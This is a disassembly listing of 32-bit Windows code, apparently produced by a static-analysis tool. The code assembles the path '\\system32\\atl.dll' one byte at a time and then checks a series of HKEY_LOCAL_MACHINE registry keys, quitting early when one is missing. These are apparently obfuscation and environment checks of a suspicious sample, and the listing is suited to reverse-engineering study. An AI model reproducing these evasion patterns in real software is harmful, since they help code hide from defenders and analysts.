
start:
0x00401220:	pushl	%ebp
0x00401221:	movl	%esp, %ebp
0x00401223:	subl	$0x16c, %esp
0x00401229:	pusha	
0x0040122a:	movl	%ebp, 0x00418250
0x00401230:	movl	$0x0, -324(%ebp)
0x0040123a:	movl	CreateFileA@kernel32.dll, %eax
0x0040123f:	movl	%eax, -344(%ebp)
0x00401245:	movl	$0x0, -276(%ebp)
0x0040124f:	movl	$0x64, -316(%ebp)
0x00401259:	movl	$0x1, -284(%ebp)
0x00401263:	movl	$0x0, -324(%ebp)
0x0040126d:	movl	$0x0, -292(%ebp)
0x00401277:	movl	$0x1, -312(%ebp)
0x00401281:	movl	$0x3, -280(%ebp)
0x0040128b:	pushl	$0x104
0x00401290:	leal	-272(%ebp), %ecx
0x00401296:	pushl	%ecx
0x00401297:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000030(MAY)
0x0040129d:	call	0x004016d0	; targets: 0x004016d0(MAY)
0x004012a2:	movl	RegOpenKeyExW@advapi32.dll, %edx	; from: 0x00401777(MAY)
0x004012a8:	movl	%edx, -304(%ebp)
0x004012ae:	leal	-296(%ebp), %eax
0x004012b4:	pushl	%eax
0x004012b5:	pushl	$0x20019
0x004012ba:	pushl	$0x0
0x004012bc:	pushl	$0x41806c
0x004012c1:	pushl	$0x80000002
0x004012c6:	call	-304(%ebp)	; targets: 0xff000020(MAY)
0x004012cc:	testl	%eax, %eax
0x004012ce:	je	0x004012df	; targets: 0x004012df(MAY), 0x004012d0(MAY)
0x004012d0:	pushl	$0x4	; from: 0x004012ce(MAY)
0x004012d2:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x004012d8:	xorl	%eax, %eax
0x004012da:	jmp	0x004016c6	; targets: 0x004016c6(MAY)
0x004012df:	leal	-296(%ebp), %ecx	; from: 0x004012ce(MAY)
0x004012e5:	pushl	%ecx
0x004012e6:	pushl	$0x20019
0x004012eb:	pushl	$0x0
0x004012ed:	pushl	$0x418080
0x004012f2:	movl	-296(%ebp), %edx
0x004012f8:	pushl	%edx
0x004012f9:	call	-304(%ebp)	; targets: 0xff000020(MAY)
0x004012ff:	testl	%eax, %eax
0x00401301:	je	0x00401312	; targets: 0x00401312(MAY), 0x00401303(MAY)
0x00401303:	pushl	$0x4	; from: 0x00401301(MAY)
0x00401305:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x0040130b:	xorl	%eax, %eax
0x0040130d:	jmp	0x004016c6	; targets: 0x004016c6(MAY)
0x00401312:	leal	-296(%ebp), %eax	; from: 0x00401301(MAY)
0x00401318:	pushl	%eax
0x00401319:	pushl	$0x20019
0x0040131e:	pushl	$0x0
0x00401320:	pushl	$0x418090
0x00401325:	movl	-296(%ebp), %ecx
0x0040132b:	pushl	%ecx
0x0040132c:	call	-304(%ebp)	; targets: 0xff000020(MAY)
0x00401332:	testl	%eax, %eax
0x00401334:	je	0x00401345	; targets: 0x00401345(MAY), 0x00401336(MAY)
0x00401336:	pushl	$0x4	; from: 0x00401334(MAY)
0x00401338:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x0040133e:	xorl	%eax, %eax
0x00401340:	jmp	0x004016c6	; targets: 0x004016c6(MAY)
0x00401345:	leal	-296(%ebp), %edx	; from: 0x00401334(MAY)
0x0040134b:	pushl	%edx
0x0040134c:	pushl	$0x20019
0x00401351:	pushl	$0x0
0x00401353:	pushl	$0x418240
0x00401358:	movl	-296(%ebp), %eax
0x0040135e:	pushl	%eax
0x0040135f:	call	-304(%ebp)	; targets: 0xff000020(MAY)
0x00401365:	testl	%eax, %eax
0x00401367:	je	0x00401378	; targets: 0x00401369(MAY), 0x00401378(MAY)
0x00401369:	pushl	$0x4	; from: 0x00401367(MAY)
0x0040136b:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x00401371:	xorl	%eax, %eax
0x00401373:	jmp	0x004016c6	; targets: 0x004016c6(MAY)
0x00401378:	leal	-296(%ebp), %ecx	; from: 0x00401367(MAY)
0x0040137e:	pushl	%ecx
0x0040137f:	pushl	$0x20019
0x00401384:	pushl	$0x0
0x00401386:	pushl	$0x418244
0x0040138b:	movl	-296(%ebp), %edx
0x00401391:	pushl	%edx
0x00401392:	call	-304(%ebp)	; targets: 0xff000020(MAY)
0x00401398:	testl	%eax, %eax
0x0040139a:	je	0x004013ab	; targets: 0x0040139c(MAY), 0x004013ab(MAY)
0x0040139c:	pushl	$0x4	; from: 0x0040139a(MAY)
0x0040139e:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x004013a4:	xorl	%eax, %eax
0x004013a6:	jmp	0x004016c6	; targets: 0x004016c6(MAY)
0x004013ab:	leal	-296(%ebp), %eax	; from: 0x0040139a(MAY)
0x004013b1:	pushl	%eax
0x004013b2:	pushl	$0x20019
0x004013b7:	pushl	$0x0
0x004013b9:	pushl	$0x4180b0
0x004013be:	movl	-296(%ebp), %ecx
0x004013c4:	pushl	%ecx
0x004013c5:	call	-304(%ebp)	; targets: 0xff000020(MAY)
0x004013cb:	testl	%eax, %eax
0x004013cd:	je	0x004013de	; targets: 0x004013de(MAY), 0x004013cf(MAY)
0x004013cf:	pushl	$0x4	; from: 0x004013cd(MAY)
0x004013d1:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x004013d7:	xorl	%eax, %eax
0x004013d9:	jmp	0x004016c6	; targets: 0x004016c6(MAY)
0x004013de:	leal	-296(%ebp), %edx	; from: 0x004013cd(MAY)
0x004013e4:	pushl	%edx
0x004013e5:	pushl	$0x20019
0x004013ea:	pushl	$0x0
0x004013ec:	pushl	$0x41809c
0x004013f1:	movl	-296(%ebp), %eax
0x004013f7:	pushl	%eax
0x004013f8:	call	-304(%ebp)	; targets: 0xff000020(MAY)
0x004016c6:	movl	%ebp, %esp	; from: 0x0040130d(MAY), 0x00401373(MAY), 0x004012da(MAY), 0x00401340(MAY), 0x004013a6(MAY), 0x004013d9(MAY)
0x004016c8:	popl	%ebp
0x004016c9:	ret	; targets: 0xfee70000(MAY)

0x004016d0:	pushl	%ebp	; from: 0x0040129d(MAY)
0x004016d1:	movl	%esp, %ebp
0x004016d3:	movl	0x00418014, %eax
0x004016d8:	movb	$0x73, 0x3(%eax)
0x004016dc:	movl	0x00418014, %ecx
0x004016e2:	movb	$0x74, 0x4(%ecx)
0x004016e6:	movl	0x00418014, %edx
0x004016ec:	movb	$0x65, 0x5(%edx)
0x004016f0:	movl	0x00418014, %eax
0x004016f5:	movb	$0x6d, 0x6(%eax)
0x004016f9:	movl	0x00418014, %ecx
0x004016ff:	movb	$0x33, 0x7(%ecx)
0x00401703:	movl	0x00418014, %edx
0x00401709:	movb	$0x32, 0x8(%edx)
0x0040170d:	movl	0x00418014, %eax
0x00401712:	movb	$0x5c, 0x9(%eax)
0x00401716:	movl	0x00418014, %ecx
0x0040171c:	movb	$0x61, 0xa(%ecx)
0x00401720:	movl	0x00418014, %edx
0x00401726:	movb	$0x74, 0xb(%edx)
0x0040172a:	movl	0x00418014, %eax
0x0040172f:	movb	$0x6c, 0xc(%eax)
0x00401733:	movl	0x00418014, %ecx
0x00401739:	movb	$0x2e, 0xd(%ecx)
0x0040173d:	movl	0x00418014, %edx
0x00401743:	movb	$0x64, 0xe(%edx)
0x00401747:	movl	0x00418014, %eax
0x0040174c:	movb	$0x6c, 0xf(%eax)
0x00401750:	movl	0x00418014, %ecx
0x00401756:	movb	$0x6c, 0x10(%ecx)
0x0040175a:	movl	0x00418014, %edx
0x00401760:	movb	$0x5c, (%edx)
0x00401763:	movl	0x00418014, %eax
0x00401768:	movb	$0x73, 0x1(%eax)
0x0040176c:	movl	0x00418014, %ecx
0x00401772:	movb	$0x79, 0x2(%ecx)
0x00401776:	popl	%ebp
0x00401777:	ret	; targets: 0x004012a2(MAY)

